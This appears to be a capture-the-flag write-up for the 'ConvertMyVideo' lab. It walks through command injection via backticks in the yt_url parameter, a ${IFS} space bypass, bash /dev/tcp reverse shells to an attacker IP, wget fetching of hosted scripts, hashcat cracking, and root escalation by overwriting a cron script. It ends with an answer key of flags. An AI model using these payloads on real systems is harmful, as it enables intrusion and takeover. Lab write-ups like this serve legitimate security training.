# ConvertMyVideo - Medium

```shell
nmap -T4 -p- -A -v 10.10.175.101

feroxbuster -u http://10.10.175.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#use Burp Suite and modify the POST request

#create and host reverse-shell script for downloading via yt_url command
echo "bash -i >& /dev/tcp/10.14.31.212/4444 0>&1" > shell.sh

python3 -m http.server

#setup listener before executing commands
nc -nvlp 4444
#we get shell after RCE

python -c 'import pty; pty.spawn("/bin/bash")'

ls -la

ls -la admin

cat admin/flag.txt

cat admin/.htpasswd

#crack password hash
hashcat -a 0 hash.txt /usr/share/wordlists/kaonashi.txt

#we can use linpeas for enumeration

#in reverse-shell
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

ps aux
#lists cron process running

cat /etc/crontab
#but no cronjobs

#inspecting processes running further
#we can use pspy tool
wget http://10.14.31.212:8000/pspy64

chmod +x pspy64

./pspy64 --help

./pspy64
#runs the tool
#we get a command running every minute
#as cronjob

#we can attempt a cron file overwrite
#get reverse-shell back first
cd tmp

echo "sh -i >& /dev/tcp/10.14.31.212/6666 0>&1" > clean.sh

#on attacker machine
nc -nvlp 6666
#we get shell as root here
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29
  * 48137 - unknown

* The webpage on port 80 contains an input to accept 'video ID', which will then convert our video.

* We can check how the website works, and in background we can enumerate the web directories as well.

* We can try using any YouTube video ID as input, but we always get the error message on clicking 'Convert!'.

* We can also take a look at the script used in /js/main.js

* Now, intercepting the request using Burp Suite, we can see that the 'yt_url' parameter includes URL-encoded YouTube link concatenated with the video ID (user input); this is a POST request.

* We can forward the POST request to Repeater and tweak it.

* When a random video ID is entered, like 'id' or 'ls', the error message mentions ```youtube-dl```

* However, if we enclose our input in backticks, such that the parameter yt_url=\`id\`, this shows the result of the command executed.

* Thus, by enclosing a command in our backticks and using that as the value of 'yt_url', we can execute commands remotely.

* Using the command 'ls' (enclosed in backticks) as an input for 'yt_url' and forwarding the POST request, we get the secret folder 'admin'.

* Now, commands with spaces do not work, so we can use the ```${IFS}``` separator instead of spaces to make the command work.

* Now, the command does not get executed if it contains symbols such as '+' or '-', so we can try to host a reverse-shell script, download it on victim machine, and get a reverse-shell on our listener.

* We will be executing the following commands using yt_url RCE (commands enclosed in backticks):

  ```shell
  which${IFS}wget

  wget${IFS}http://10.14.31.212:8000/shell.sh

  chmod${IFS}777${IFS}shell.sh

  bash${IFS}shell.sh
  ```

* This gives us a reverse-shell on our listener as ```www-data```; we can get user flag from the /admin folder.

* From the /admin folder, we also get .htpasswd file, which contains the username and hash for login.

* We can attempt to crack the hash using ```hashcat```, we get the password 'jessie'.

* Now, we can check for enumeration using linpeas.sh; it does not give us a lot of clues.

* Now, checking the processes running (captured by linpeas), we can see that it is running 'cron', but we do not have any cronjobs listed.

* To monitor the processes running as root without root permissions, we can use the ```pspy``` tool, by transferring it from attacker to victim machine.

* We can run the ```pspy``` tool with the help flag and check what we can do to inspect processes and cronjobs.

* Running the tool, we get a list of processes running, and we can see that the following command is executed as a cronjob every minute:

  ```/bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh```

* So, we can attempt to overwrite ```clean.sh``` and escalate our privileges; but we have to get our reverse shell back first.

* Using Ctrl+C, we stop the process, and run the Burp Suite RCE again to get our reverse-shell back on listener.

* Now, we can edit ```clean.sh``` and add our reverse-shell one-liner.

* On our new listener, we get reverse-shell within a minute as root, and we can read the root flag.

```markdown
1. What is the name of the secret folder? - admin

2. What is the user to access the secret folder? - itsmeadmin

3. What is the user flag? - flag{0d8486a0c0c42503bb60ac77f4046ed7}

4. What is the root flag? - flag{d9b368018e912b541a4eb68399c5e94a}
```
